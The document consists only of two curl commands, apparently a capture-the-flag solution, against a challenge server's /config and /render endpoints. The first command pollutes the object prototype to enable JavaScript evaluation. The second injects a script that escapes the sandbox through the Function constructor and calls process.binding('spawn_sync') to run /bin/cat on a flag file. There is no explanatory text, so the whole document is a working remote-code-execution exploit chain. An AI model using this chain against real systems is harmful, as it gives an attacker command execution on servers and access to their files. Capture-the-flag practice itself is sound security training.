```
curl -s http://challenges3.ctf.sd:33635/config -H "Content-Type: application/json" \
  -d '{"polluter": "[Circular (__proto__)]", "polluter.settings": {}, "polluter.settings.enableJavaScriptEvaluation": true}'
  ```

```
curl -s http://challenges3.ctf.sd:33635/render -H "Content-Type: application/json" \
  -d '{"html": "<script>const process = this.constructor.constructor(\"return process\")(); const spawn = process.binding(\"spawn_sync\"); const opts = {file: \"/bin/cat\", args: [\"cat\", \"/flag_409b00f155ca4c97.txt\"], envPairs: [], stdio: [{type:\"pipe\",readable:true,writable:false},{type:\"pipe\",readable:false,writable:true},{type:\"pipe\",readable:false,writable:true}]}; const result = spawn.spawn(opts); document.body.innerHTML = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));</script>"}'
  ```


